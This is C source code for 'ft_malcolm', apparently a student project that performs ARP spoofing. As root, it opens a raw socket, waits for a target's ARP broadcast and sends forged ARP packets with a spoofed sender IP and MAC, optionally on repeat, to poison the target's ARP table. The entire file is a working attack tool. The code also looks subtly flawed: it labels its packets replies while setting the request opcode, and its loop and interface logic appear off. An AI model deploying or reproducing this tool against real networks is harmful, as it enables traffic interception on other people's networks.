#include "../include.h"

int wait_for_arp_req(int socketfd, struct ft_malcolm * malcolm)
{
    unsigned char		buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
    struct arp_header * arp_req = (struct arp_header *)(buffer + sizeof(struct ethhdr));

    if (malcolm->verbose)
    {
        printf("Waiting for ARP request form ");
        print_ipv4(malcolm->target_ip);
    }
	ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(struct arp_header));
    while (ft_memcmp(arp_req->sender_mac, malcolm->target_mac, MAC_LENGTH) != 0 && ft_memcmp(arp_req->sender_ip, malcolm->target_ip, IPV4_LENGTH) != 0)
    {
        ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(struct arp_header));
        while (ft_memcmp(buffer, "\xff\xff\xff\xff\xff\xff", MAC_LENGTH))
        {
            if(recvfrom(socketfd, &buffer, sizeof(buffer), 0, NULL, NULL) <= 0)
            {
                perror("recvfrom(): ");
                return -1;
            }
        }
    }

    printf("An ARP request has been broadcast.\n");
    printf("\tmac address of request: ");
    print_mac(arp_req->sender_mac);
    printf("\tIP address of request: ");
    print_ipv4(arp_req->sender_ip);
    return (0);
}

int get_interface(struct ft_malcolm * malcolm)
{
    struct ifaddrs * ifaddr;
    struct ifaddrs * temp;
    int index = 1;

    if (getifaddrs(&ifaddr) == -1) 
    {
        perror("getifaddrs(): ");
        return -1;
    }

    for (temp = ifaddr; temp != NULL; temp = temp->ifa_next)
    {
        if (
            (temp->ifa_addr && temp->ifa_addr->sa_family != AF_INET) || // interface has ipv4
            ((IFF_UP & temp->ifa_flags) != IFF_UP) //interface is not up
        )
        {
            if (malcolm->verbose)
                printf("Interface not suitable found %s / family : %s\n", temp->ifa_name, (temp->ifa_addr->sa_family == AF_INET ? "AF_INET" : temp->ifa_addr->sa_family == AF_INET6 ? "AF_INET6" : "AF_PACKET"));
            continue;
        }
        if (((IFF_LOOPBACK  & temp->ifa_flags) != IFF_LOOPBACK)) // interface is not a loop back (lo)
        {
          printf("Found available interface: %s\n", temp->ifa_name);
          malcolm->socket_address->sll_ifindex = index;
          freeifaddrs(ifaddr);
          return (0);
        }
        else if (malcolm->verbose)
        {
            printf("Suitable interface ignore : %s\n", temp->ifa_name);
        }
        index++;
    }
    freeifaddrs(ifaddr);
    return (-1);
}

int send_arp_res(int socket, struct ft_malcolm * malcolm) 
{
    unsigned char buffer[BUF_SIZE];
    struct arp_header *arp_req = (struct arp_header *)(buffer + ETH2_HEADER_LEN); // header arp
    struct ethhdr *send_req = (struct ethhdr *)buffer; // content arp
        
    ft_memset(buffer, 0x00, 60);
    ft_memcpy(send_req->h_dest, malcolm->target_mac, MAC_LENGTH);
    ft_memcpy(arp_req->target_mac, malcolm->target_mac, MAC_LENGTH);

    ft_memcpy(send_req->h_source, malcolm->sender_mac, MAC_LENGTH);
    ft_memcpy(arp_req->sender_mac, malcolm->sender_mac, MAC_LENGTH);
    
    /* Setting protocol of the packet */
    send_req->h_proto = htons(ETH_P_ARP);

    /* Creating ARP request */
    arp_req->hardware_type = htons(HW_TYPE);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = MAC_LENGTH;
    arp_req->protocol_len = IPV4_LENGTH;
    arp_req->opcode = htons(ARP_REQUEST);

    ft_memcpy(arp_req->sender_ip, malcolm->sender_ip, sizeof(uint32_t));
    ft_memcpy(arp_req->target_ip, malcolm->target_ip, sizeof(uint32_t));

    if (sendto(socket, buffer, sizeof(buffer), 0, (struct  sockaddr*)malcolm->socket_address, sizeof(struct sockaddr_ll)) == -1)
    {
        perror("sendto(): ");
        return (-1);
    }
    else
    {
        printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
        if (malcolm->verbose)
        {
            printf("ARP Packet sent hexdump: \n\t");
            for(int index=0;index<42;index++)
            {
                printf("%02X ",buffer[index]);
                if (index % 16 == 0 && index != 0)
                    printf("\n\t");
            }
            printf("\n");
        }
    } 
    return (0);
}

void init_struct(struct sockaddr_ll * socket_address, struct ft_malcolm * malcolm, char ** argv)
{
    uint32_t src_ip = inet_addr(argv[malcolm->padding + 1]);
    uint32_t dest_ip = inet_addr(argv[malcolm->padding + 3]);
    const char *DEST_MAC = argv[malcolm->padding + 4];
    const char *SRC_MAC = argv[malcolm->padding + 2];
    
    convert_mac(DEST_MAC, malcolm->target_mac);
    convert_mac(SRC_MAC, malcolm->sender_mac);
    ft_memcpy(malcolm->sender_ip, &src_ip, sizeof(uint32_t));
    ft_memcpy(malcolm->target_ip, &dest_ip, sizeof(uint32_t));

    /*prepare sockaddr_ll*/
    ft_memset(socket_address, 0x00, sizeof(struct sockaddr_ll));
    socket_address->sll_family = AF_PACKET;
    socket_address->sll_protocol = htons(ETH_P_ARP);
    socket_address->sll_hatype = htons(ARPHRD_ETHER);
    socket_address->sll_pkttype = (PACKET_HOST);
    socket_address->sll_halen = MAC_LENGTH;
    convert_mac(DEST_MAC, socket_address->sll_addr);
}

int main(int argc, char** argv)
{
    struct ft_malcolm malcolm;
    struct sockaddr_ll socket_address;
    int socket_fd, interface_index;

    malcolm.socket_address = &socket_address;

    if (check_args(argc, argv, &malcolm)) 
        return 1;

    if (getuid() != 0) 
    {
        dprintf(2, "You must be root to launch %s\n", argv[0]);
        return 1;
    }
    
    if (check_mac_format(argv[malcolm.padding + 4]) == -1 || check_mac_format(argv[malcolm.padding + 2]) == -1)
    {
        dprintf(2, "Wrong mac address format\n");
        return (1);
    }

    if (check_ip_format(argv[malcolm.padding + 1]) == -1 || check_ip_format(argv[malcolm.padding + 3]) == -1)
    {
        dprintf(2, "Wrong ip address format\n");
        return (1);
    }

    if (dns_lookup(argv[malcolm.padding + 3]) == -1 || dns_lookup(argv[malcolm.padding + 1]) == -1)
        return (1);

    // Submit request for a raw socket descriptor.
    if ((socket_fd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
        perror ("socket(): ");
        return 1;
    }

    init_struct(&socket_address, &malcolm, argv);

    if((interface_index = get_interface(&malcolm)) == -1)
    {
        dprintf(2, "Error while obtaining interface index \n");
        return (1);
    }

 
    if(malcolm.waitArpReq == 0 && wait_for_arp_req(socket_fd, &malcolm) == -1)
    {
        dprintf(2, "Error while waiting for ARP request \n");
        return (1);
    }
    

    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
    do
    {
        if(send_arp_res(socket_fd, &malcolm) == -1)
        {
            dprintf(2, "Error while waiting for ARP request \n");
            return (1);
        }
        sleep(1);
    } while (malcolm.repeate);

    printf("Exiting program...\n");
    close(socket_fd);
    return (0);
}